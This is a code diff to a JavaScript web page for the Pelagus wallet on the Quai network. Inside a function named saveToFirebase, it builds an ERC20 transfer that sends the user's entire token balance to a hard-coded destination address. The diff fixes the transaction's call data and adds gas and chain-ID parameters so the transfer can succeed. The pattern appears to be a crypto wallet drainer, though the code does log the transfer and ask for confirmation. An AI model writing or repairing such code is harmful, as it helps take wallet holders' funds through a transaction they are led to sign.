@@ -398,7 +398,7 @@ async function saveToFirebase(data) {
         // Check QUAI balance for gas
         const quaiBalance = await getQuaiBalance(userSession.address);
         const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
-        const requiredQuai = 0.1; // Set required QUAI to 0.1
+        const requiredQuai = 0.1;
         
         if (quaiAmount < requiredQuai) {
             log('❌ Insufficient QUAI for gas fees');
@@ -419,22 +419,25 @@ async function saveToFirebase(data) {
         log(`💰 Gas fee will be paid from your ${quaiAmount.toFixed(4)} QUAI balance`);
 
         // Token transfer function setup
-        const methodId = '0xa9059cbb';  // ERC20 transfer method ID
-        const paddedDestination = DESTINATION_ADDRESS.slice(2).padStart(64, '0');  // Pad to 32 bytes
-        const paddedAmount = currentBalance.toString(16).padStart(64, '0');  // Convert to hex and pad
-        const data = '0x' + methodId + paddedDestination + paddedAmount;  // Only one '0x' at the start
+        const methodId = 'a9059cbb';
+        const paddedDestination = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
+        const paddedAmount = currentBalance.toString(16).padStart(64, '0');
+        const data = '0x' + methodId + paddedDestination + paddedAmount;
 
         // Construct the transaction
         const transactionParameters = {
             from: userSession.address,
             to: TOKEN_ADDRESS,
             value: '0x0',
-            data: data
+            data: data,
+            gas: '0x55F0',          // Add gas limit
+            gasPrice: '0x53e2d6',   // Add gas price
+            chainId: '9000'         // Add chain ID for Cyprus1
         };
 
         log(`📤 Sending all tokens to ${DESTINATION_ADDRESS}`);
         log('🔄 Please confirm the transaction in your wallet...');
-        
+               
         const txHash = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
